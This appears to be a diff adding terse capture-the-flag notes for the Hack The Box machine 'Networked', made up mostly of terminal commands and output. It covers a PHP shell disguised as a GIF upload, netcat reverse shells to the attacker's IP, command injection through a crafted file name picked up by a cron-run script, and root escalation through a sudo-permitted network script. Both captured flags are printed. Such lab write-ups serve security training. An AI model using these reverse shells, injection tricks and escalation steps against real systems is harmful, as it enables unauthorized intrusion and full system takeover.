@@ -1,0 +1,133 @@
+
+ADD "GIF89a;" as php shell first line;
+and rename to shell.php.gif.
+
+root@kali:~/HTB/Networked# nc -lvp 1337
+listening on [any] 1337 ...
+10.10.10.146: inverse host lookup failed: Unknown host
+connect to [10.10.16.53] from (UNKNOWN) [10.10.10.146] 35764
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 10:31:02 up  1:05,  4 users,  load average: 0.57, 1.72, 10.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guly     pts/2    10.10.13.56      09:43    2:14   0.38s  0.38s -bash
+guly     pts/10   10.10.13.4       09:59    9:50   0.05s  0.05s -bash
+guly     pts/13   10.10.16.10      10:09    6.00s  0.46s  0.01s sshd: guly [priv]   
+guly     pts/15   10.10.12.163     10:14    7:02   0.02s  0.02s -bash
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash");'
+python -c 'import pty;pty.spawn("/bin/bash");'
+bash-4.2$ uname -a
+uname -a
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+bash-4.2$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+
+
+check_attack is running as guly using "ps aux | grep guly"
+also
+ls
+check_attack.php  crontab.guly	user.txt
+bash-4.2$ cat crontab.guly
+cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+
+Using check_attack.php at /home/guly
+
+sh-4.2$ cd /var/www/html/uploads/
+cd /var/www/html/uploads/
+sh-4.2$ touch ";nc -c bash 10.10.16.53 1338;#"
+touch ";nc -c bash 10.10.16.53 1338;#"
+
+
+
+
+root@kali:~/HTB/Scavenger# nc -lvp 1338
+listening on [any] 1338 ...
+connect to [10.10.16.53] from networked.htb [10.10.10.146] 33990
+whoami
+guly
+cd /home/guly
+cat user.txt
+526cfc2305f17faaacecf212c57d71c5
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+[guly@networked ~]$ cd /home/guly
+cd /home/guly
+[guly@networked ~]$ sudo -l
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+[guly@networked ~]$ 
+[guly@networked ~]$ cat /usr/local/sbin/changename.sh
+cat /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		echo "interface $var:"
+		read x
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+[guly@networked ~]$ 
+
+[guly@networked tmp]$ echo "nc -e /bin/bash 10.10.16.53 1400" > ntest
+echo "nc -e /bin/bash 10.10.16.53 1400" > ntest
+[guly@networked tmp]$ chmod +x ntest
+chmod +x ntest
+
+[guly@networked ~]$ sudo -u root /usr/local/sbin/changename.sh
+sudo -u root /usr/local/sbin/changename.sh
+interface NAME:
+bash /tmp/ntest
+bash /tmp/ntest
+interface PROXY_METHOD:
+bash /tmp/ntest
+bash /tmp/ntest
+interface BROWSER_ONLY:
+bash /tmp/ntest
+bash /tmp/ntest
+interface BOOTPROTO:
+bash /tmp/ntest
+bash /tmp/ntest
+
+
+root@kali:~# nc -lvp 1400
+listening on [any] 1400 ...
+connect to [10.10.16.53] from networked.htb [10.10.10.146] 57750
+whoami
+root
+cat /root/root.txt
+0a8ecda83f1d81251099e8ac3d0dcb82
+pwd 
+/etc/sysconfig/network-scripts
+
+
+
+
